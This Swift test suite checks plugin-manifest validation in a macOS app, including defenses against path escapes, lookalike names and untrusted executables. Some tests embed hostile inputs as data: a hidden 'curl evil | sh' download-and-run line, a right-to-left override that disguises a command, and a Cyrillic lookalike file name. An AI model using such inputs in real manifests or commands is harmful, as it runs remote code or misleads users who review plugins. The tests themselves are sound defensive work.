import Foundation
import Testing
@testable import Codenotch

struct PluginManifestTests {
    private func makeDirectory() throws -> URL {
        let directory = FileManager.default.temporaryDirectory
            .appendingPathComponent("PluginManifestTests.\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        return directory
    }

    private func manifestJSON(
        id: String = "plugin-codemie-budget",
        schema: Int = 1,
        displayName: String = "CodeMie Budget",
        execPath: String = "/bin/sh",
        execArgs: String = #"["snapshot"]"#,
        signInRun: String? = #""signIn": {"guidance": "Run codemie profile login.", "run": ["/bin/sh", "-l"]},"#,
        glyph: String? = nil
    ) -> Data {
        var glyphSection = ""
        if let glyph {
            glyphSection = #""glyph": {"image": "\#(glyph)", "opticalScale": 0.95},"#
        }
        return Data(#"""
        {
            "schema": \#(schema),
            "id": "\#(id)",
            "displayName": "\#(displayName)",
            "version": "0.1.0",
            "exec": {"path": "\#(execPath)", "args": \#(execArgs), "timeoutSeconds": 12},
            \#(glyphSection)
            \#(signInRun ?? "")
            "activity": {"type": "claudeSessions", "configDir": "~/.claude"}
        }
        """#.utf8)
    }

    private func decode(_ data: Data) throws -> PluginManifest {
        try JSONDecoder().decode(PluginManifest.self, from: data)
    }

    // MARK: - Decoding

    @Test func decodesAFullManifest() throws {
        let manifest = try decode(manifestJSON(glyph: "glyph.png"))

        #expect(manifest.schema == 1)
        #expect(manifest.id == "plugin-codemie-budget")
        #expect(manifest.displayName == "CodeMie Budget")
        #expect(manifest.exec.path == "/bin/sh")
        #expect(manifest.exec.args == ["snapshot"])
        #expect(manifest.exec.timeout == 12)
        #expect(manifest.glyph?.image == "glyph.png")
        #expect(manifest.glyph?.opticalScale == 0.95)
        #expect(manifest.signIn?.guidance == "Run codemie profile login.")
        #expect(manifest.signIn?.run == ["/bin/sh", "-l"])
        #expect(manifest.activity?.type == "claudeSessions")
    }

    @Test func timeoutDefaultsToTwentySeconds() throws {
        let data = Data(#"""
        {"schema": 1, "id": "x", "displayName": "X", "version": "1",
         "exec": {"path": "/bin/sh", "args": []}}
        """#.utf8)
        #expect(try decode(data).exec.timeout == 20)
    }

    // MARK: - ID shape

    /// Every plugin id starts with `plugin-`: a namespace no built-in will
    /// ever use, so a plugin cannot claim an id a future built-in takes.
    @Test(arguments: ["plugin-claude", "plugin-codemie-budget", "plugin-a", "plugin-a1", "plugin-1a",
                      "plugin-codemie-claude-2"])
    func validIDs(id: String) {
        #expect(PluginManifest.isValidID(id))
    }

    @Test(arguments: ["", "Codemie", "-codemie", "codemie_claude", "codemie claude",
                      "codemie.budget", "plugin-" + String(repeating: "a", count: 58),
                      "caf\u{301}", "克劳德",
                      // Outside the namespace, or the bare namespace.
                      "claude", "codemie-budget", "plugin", "plugin-", "Plugin-x", "plugin--"])
    func invalidIDs(id: String) {
        #expect(!PluginManifest.isValidID(id))
    }

    // MARK: - Validation

    @Test func acceptsAValidManifest() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON())
        let validated = try manifest.validated(builtInIDs: ["claude"], pluginDirectory: directory)
        #expect(validated == manifest)
    }

    @Test func rejectsAnUnknownSchema() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(schema: 2))
        #expect(throws: PluginManifest.ValidationError.unsupportedSchema(2)) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAMalformedID() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(id: "CodeMie"))
        #expect(throws: PluginManifest.ValidationError.malformedID("CodeMie")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsACollisionWithABuiltIn() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        // The namespace keeps built-ins out of the way by construction; the
        // check still holds the line should one ever wander in.
        let manifest = try decode(manifestJSON(id: "plugin-claude"))
        #expect(throws: PluginManifest.ValidationError.collidesWithBuiltIn("plugin-claude")) {
            try manifest.validated(builtInIDs: ["plugin-claude"], pluginDirectory: directory)
        }
    }

    @Test func rejectsARelativeExecPath() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(execPath: "bin/sh"))
        #expect(throws: PluginManifest.ValidationError.execNotAbsolute("bin/sh")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAMissingExec() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(execPath: "/no/such/binary"))
        #expect(throws: PluginManifest.ValidationError.execMissing("/no/such/binary")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsANonExecutableExec() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let file = directory.appendingPathComponent("not-executable")
        try "echo hi".write(to: file, atomically: true, encoding: .utf8)
        let manifest = try decode(manifestJSON(execPath: file.path))
        #expect(throws: PluginManifest.ValidationError.execNotExecutable(file.path)) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAMissingGlyphFile() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(glyph: "glyph.png"))
        #expect(throws: PluginManifest.ValidationError.glyphMissing("glyph.png")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func acceptsAGlyphThatExists() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        try Data([0x89, 0x50, 0x4E, 0x47]).write(to: directory.appendingPathComponent("glyph.png"))
        let manifest = try decode(manifestJSON(glyph: "glyph.png"))
        #expect(throws: Never.self) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAnUnknownActivityType() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let data = Data(#"""
        {"schema": 1, "id": "plugin-x", "displayName": "X", "version": "1",
         "exec": {"path": "/bin/sh", "args": []},
         "activity": {"type": "watchDirectory", "configDir": "/tmp"}}
        """#.utf8)
        let manifest = try decode(data)
        #expect(throws: PluginManifest.ValidationError.unknownActivity("watchDirectory")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    // MARK: - Display name

    @Test func rejectsAnEmptyDisplayName() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(displayName: "   "))
        #expect(throws: PluginManifest.ValidationError.malformedDisplayName("   ")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsATooLongDisplayName() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let name = String(repeating: "a", count: 41)
        let manifest = try decode(manifestJSON(displayName: name))
        #expect(throws: PluginManifest.ValidationError.malformedDisplayName(name)) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsADisplayNameWithControlCharacters() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        // A raw BEL would be invalid JSON; the `\u0007` escape decodes to it.
        let manifest = try decode(manifestJSON(displayName: #"Code\u0007Mie"#))
        #expect(throws: PluginManifest.ValidationError.malformedDisplayName("Code\u{7}Mie")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsADisplayNameImpersonatingABuiltIn() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(displayName: "claude"))
        #expect(throws: PluginManifest.ValidationError.impersonatesBuiltIn("claude")) {
            try manifest.validated(builtInIDs: [], builtInDisplayNames: ["Claude"],
                                   pluginDirectory: directory)
        }
    }

    @Test func rejectsAPaddedBuiltInDisplayName() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(displayName: " Claude"))
        #expect(throws: PluginManifest.ValidationError.impersonatesBuiltIn(" Claude")) {
            try manifest.validated(builtInIDs: [], builtInDisplayNames: ["Claude"],
                                   pluginDirectory: directory)
        }
    }

    /// Lookalikes: another script's letters, accents, digits, punctuation,
    /// fullwidth forms, stray spaces. All read "Claude".
    @Test(arguments: ["Сlaude", "Clаude", "Clàude", "C1aude", "Claude!", "Ｃｌａｕｄｅ", "cl aude"])
    func rejectsAConfusableBuiltInDisplayName(name: String) throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(displayName: name))
        #expect(throws: PluginManifest.ValidationError.impersonatesBuiltIn(name)) {
            try manifest.validated(builtInIDs: [], builtInDisplayNames: ["Claude"],
                                   pluginDirectory: directory)
        }
    }

    /// Names that merely mention a built-in are not that built-in: the
    /// reference plugin is "CodeMie Claude", and the notch and tooltip badge
    /// every plugin regardless.
    @Test(arguments: ["CodeMie Claude", "Claude Max", "Claude (work)", "Codex"])
    func acceptsADisplayNameThatIsNotABuiltIn(name: String) throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(displayName: name))
        #expect(throws: Never.self) {
            try manifest.validated(builtInIDs: [], builtInDisplayNames: ["Claude"],
                                   pluginDirectory: directory)
        }
    }

    /// Invisible characters never reach the skeleton: they are control
    /// characters to the name check, and malformed on their own.
    @Test(arguments: ["Claude\u{200B}", "Cla\u{00AD}ude"])
    func rejectsAnInvisibleCharacterAsMalformed(name: String) throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(displayName: name))
        #expect(throws: PluginManifest.ValidationError.malformedDisplayName(name)) {
            try manifest.validated(builtInIDs: [], builtInDisplayNames: ["Claude"],
                                   pluginDirectory: directory)
        }
    }

    @Test func theSkeletonFoldsWhatAReaderCannotTell() {
        #expect(PluginManifest.skeleton("Claude") == "claude")
        #expect(PluginManifest.skeleton("Сlaude") == "claude")
        #expect(PluginManifest.skeleton("Ｃｌａｕｄｅ") == "claude")
        #expect(PluginManifest.skeleton("GitHub Copilot") == "githubcopilot")
        #expect(PluginManifest.skeleton("CodeMie Claude") != "claude")
    }

    // MARK: - Glyph containment

    @Test func rejectsAGlyphThatEscapesThePluginDirectory() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(glyph: "../outside.png"))
        #expect(throws: PluginManifest.ValidationError.glyphEscapesPluginDirectory("../outside.png")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAGlyphSymlinkThatEscapesThePluginDirectory() throws {
        let root = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: root) }
        let outside = root.appendingPathComponent("outside.png")
        try Data([0x89, 0x50, 0x4E, 0x47]).write(to: outside)
        let directory = root.appendingPathComponent("plugin", isDirectory: true)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(
            at: directory.appendingPathComponent("glyph.png"),
            withDestinationURL: outside)
        let manifest = try decode(manifestJSON(glyph: "glyph.png"))
        #expect(throws: PluginManifest.ValidationError.glyphEscapesPluginDirectory("glyph.png")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAGlyphInASiblingDirectorySharingANamePrefix() throws {
        let root = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: root) }
        let directory = root.appendingPathComponent("plugin", isDirectory: true)
        let sibling = root.appendingPathComponent("plugin-extra", isDirectory: true)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: sibling, withIntermediateDirectories: true)
        try Data([0x89, 0x50, 0x4E, 0x47]).write(to: sibling.appendingPathComponent("glyph.png"))
        let manifest = try decode(manifestJSON(glyph: "../plugin-extra/glyph.png"))
        #expect(throws: PluginManifest.ValidationError.glyphEscapesPluginDirectory("../plugin-extra/glyph.png")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func acceptsAGlyphSymlinkThatStaysInsideThePluginDirectory() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let target = directory.appendingPathComponent("glyph.png")
        try Data([0x89, 0x50, 0x4E, 0x47]).write(to: target)
        try FileManager.default.createSymbolicLink(
            at: directory.appendingPathComponent("icon.png"),
            withDestinationURL: target)
        let manifest = try decode(manifestJSON(glyph: "icon.png"))
        #expect(throws: Never.self) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    // MARK: - signIn.run

    @Test func rejectsARelativeSignInExecutable() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(
            signInRun: #""signIn": {"guidance": "g", "run": ["codemie", "login"]},"#))
        #expect(throws: PluginManifest.ValidationError.signInNotAbsolute("codemie")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAMissingSignInExecutable() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(
            signInRun: #""signIn": {"guidance": "g", "run": ["/no/such/tool"]},"#))
        #expect(throws: PluginManifest.ValidationError.signInMissing("/no/such/tool")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsANonExecutableSignInExecutable() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let file = directory.appendingPathComponent("tool")
        try "echo hi".write(to: file, atomically: true, encoding: .utf8)
        let manifest = try decode(manifestJSON(
            signInRun: "\"signIn\": {\"guidance\": \"g\", \"run\": [\"\(file.path)\"]},"))
        #expect(throws: PluginManifest.ValidationError.signInNotExecutable(file.path)) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAGroupWritableSignInExecutable() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let file = directory.appendingPathComponent("tool")
        try "#!/bin/sh\n".write(to: file, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o775], ofItemAtPath: file.path)
        let manifest = try decode(manifestJSON(
            signInRun: "\"signIn\": {\"guidance\": \"g\", \"run\": [\"\(file.path)\"]},"))
        #expect(throws: PluginManifest.ValidationError.signInUntrusted(file.path)) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    // MARK: - Executable trust

    @Test func rejectsAGroupWritableExec() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let file = directory.appendingPathComponent("tool")
        try "#!/bin/sh\n".write(to: file, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o775], ofItemAtPath: file.path)
        let manifest = try decode(manifestJSON(execPath: file.path))
        #expect(throws: PluginManifest.ValidationError.execUntrusted(file.path)) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func acceptsASystemExec() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(execPath: "/bin/sh"))
        #expect(throws: Never.self) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    // MARK: - Executable placement

    private func writeExecutable(in directory: URL, named name: String = "tool") throws -> URL {
        let file = directory.appendingPathComponent(name)
        try "#!/bin/sh\n".write(to: file, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: file.path)
        return file
    }

    @Test func acceptsAUserOwnedExecInsideThePluginDirectory() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let file = try writeExecutable(in: directory)
        let manifest = try decode(manifestJSON(execPath: file.path))
        #expect(throws: Never.self) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAUserOwnedExecOutsideThePluginDirectory() throws {
        let directory = try makeDirectory()
        let elsewhere = try makeDirectory()
        defer {
            try? FileManager.default.removeItem(at: directory)
            try? FileManager.default.removeItem(at: elsewhere)
        }
        // Owned, 0755, not a symlink: trusted by every mode check, and still
        // refused — the hash cannot see it change.
        let file = try writeExecutable(in: elsewhere)
        let manifest = try decode(manifestJSON(execPath: file.path))
        #expect(throws: PluginManifest.ValidationError.execOutsidePluginDirectory(file.path)) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsEnvAsTheExec() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(execPath: "/usr/bin/env", execArgs: #"["node", "x.js"]"#))
        #expect(throws: PluginManifest.ValidationError.execNotAllowlisted("/usr/bin/env")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAUserOwnedSignInOutsideThePluginDirectory() throws {
        let directory = try makeDirectory()
        let elsewhere = try makeDirectory()
        defer {
            try? FileManager.default.removeItem(at: directory)
            try? FileManager.default.removeItem(at: elsewhere)
        }
        let file = try writeExecutable(in: elsewhere)
        let manifest = try decode(manifestJSON(
            signInRun: "\"signIn\": {\"guidance\": \"g\", \"run\": [\"\(file.path)\"]},"))
        #expect(throws: PluginManifest.ValidationError.signInOutsidePluginDirectory(file.path)) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    // MARK: - Argument containment

    @Test func acceptsArgumentsThatStayInsideThePluginDirectory() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let inside = directory.appendingPathComponent("run.sh").path
        let manifest = try decode(manifestJSON(
            execArgs: #"["\#(inside)", "script.sh", "--flag", "-c", "echo"]"#))
        #expect(throws: Never.self) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAnAbsoluteArgumentOutsideThePluginDirectory() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        // `/bin/sh /Users/me/run.sh`: the script is the code, and it is not
        // where the hash covers it.
        let manifest = try decode(manifestJSON(execArgs: #"["/Users/me/run.sh"]"#))
        #expect(throws: PluginManifest.ValidationError.argumentOutsidePluginDirectory("/Users/me/run.sh")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAnArgumentThatEscapesWithDotDot() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let escaping = directory.appendingPathComponent("../run.sh").path
        let manifest = try decode(manifestJSON(execArgs: #"["\#(escaping)"]"#))
        #expect(throws: PluginManifest.ValidationError.argumentOutsidePluginDirectory(escaping)) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsASignInArgumentOutsideThePluginDirectory() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(
            signInRun: #""signIn": {"guidance": "g", "run": ["/bin/sh", "/Users/me/login.sh"]},"#))
        #expect(throws: PluginManifest.ValidationError.argumentOutsidePluginDirectory("/Users/me/login.sh")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    // MARK: - Security review round 2

    @Test func rejectsARelativeArgumentThatEscapesWithDotDot() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        // The child runs with the plugin directory as cwd, so `../run.sh` is
        // a file in the plugins root — never scanned, never hashed.
        let manifest = try decode(manifestJSON(execArgs: #"["../run.sh"]"#))
        #expect(throws: PluginManifest.ValidationError.argumentOutsidePluginDirectory("../run.sh")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsARelativeArgumentThroughASymlinkThatEscapes() throws {
        let root = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: root) }
        let outside = root.appendingPathComponent("elsewhere", isDirectory: true)
        let directory = root.appendingPathComponent("plugin", isDirectory: true)
        try FileManager.default.createDirectory(at: outside, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(
            at: directory.appendingPathComponent("lib"), withDestinationURL: outside)
        let manifest = try decode(manifestJSON(execArgs: #"["lib/run.sh"]"#))
        #expect(throws: PluginManifest.ValidationError.argumentOutsidePluginDirectory("lib/run.sh")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsARootOwnedExecOutsideTheInterpreterAllowlist() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        // zsh sources ~/.zshenv for a script, and HOME is in the child's
        // environment: user-writable code the hash never sees.
        let manifest = try decode(manifestJSON(execPath: "/bin/zsh"))
        #expect(throws: PluginManifest.ValidationError.execNotAllowlisted("/bin/zsh")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsASignInExecutableOutsideTheInterpreterAllowlist() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(
            signInRun: #""signIn": {"guidance": "g", "run": ["/usr/bin/python3", "login.py"]},"#))
        #expect(throws: PluginManifest.ValidationError.signInNotAllowlisted("/usr/bin/python3")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsAnArgumentWithAControlOrFormatCharacter() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        // A right-to-left override reverses what the approval row prints;
        // a newline pushes the rest of the command out of the line the
        // user reads. Both are refused before anything is shown.
        let override = "echo \u{202E}hs | live"
        let overriding = try decode(manifestJSON(execArgs: "[\"-c\", \"\(override)\"]"))
        #expect(throws: PluginManifest.ValidationError.malformedArgument(override)) {
            try overriding.validated(builtInIDs: [], pluginDirectory: directory)
        }
        let breaking = try decode(manifestJSON(execArgs: #"["-c", "echo ok\n\n\ncurl evil | sh"]"#))
        #expect(throws: PluginManifest.ValidationError.malformedArgument("echo ok\n\n\ncurl evil | sh")) {
            try breaking.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsASignInArgumentWithAControlCharacter() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        let manifest = try decode(manifestJSON(
            signInRun: #""signIn": {"guidance": "g", "run": ["/bin/sh", "-c", "a\tb"]},"#))
        #expect(throws: PluginManifest.ValidationError.malformedArgument("a\tb")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsOpenAsTheExec() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        // `open -a Helper` launches whatever LaunchServices has under that
        // name, which the user's own processes can change after approval.
        let manifest = try decode(manifestJSON(execPath: "/usr/bin/open", execArgs: #"["-a", "Helper"]"#))
        #expect(throws: PluginManifest.ValidationError.execNotAllowlisted("/usr/bin/open")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }

    @Test func rejectsANonASCIIArgument() throws {
        let directory = try makeDirectory()
        defer { try? FileManager.default.removeItem(at: directory) }
        // A Cyrillic р: `рun.sh` prints as `run.sh`, and the user who opens
        // the folder to read `run.sh` reads the wrong file.
        let manifest = try decode(manifestJSON(execArgs: #"["\#u{0440}un.sh"]"#))
        #expect(throws: PluginManifest.ValidationError.malformedArgument("\u{0440}un.sh")) {
            try manifest.validated(builtInIDs: [], pluginDirectory: directory)
        }
    }
}
